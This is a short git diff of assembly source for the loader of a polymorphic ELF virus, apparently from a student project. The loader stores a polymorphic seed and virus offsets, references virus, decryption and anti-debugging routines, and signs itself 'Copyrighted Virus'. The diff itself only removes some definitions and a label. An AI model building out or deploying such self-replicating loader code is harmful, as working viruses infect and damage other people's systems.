@@ -6,24 +6,21 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/22 20:47:47 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/26 21:53:55 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
 %define SYSCALL_WRITE		0x01
-%define SYSCALL_EXIT		0x3c
 %define SYSCALL_MPROTECT	0x0a
 %define STDOUT			0x01
 %define PROT_RWX		0x07
 %define CALL_INSTR_SIZE		0x05
-%define SYSCALL_FORK		0x39
 
 section .text
 	global loader_entry
 	global mark_below
 	global return_to_client
 
-extern _start
 extern virus
 extern decypher
 extern detect_spy
@@ -31,7 +28,6 @@ extern detect_spy
 loader_entry:
 ;------------------------------; Store variables
 	call mark_below
-ici:
 	db "polymorphic seed", "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
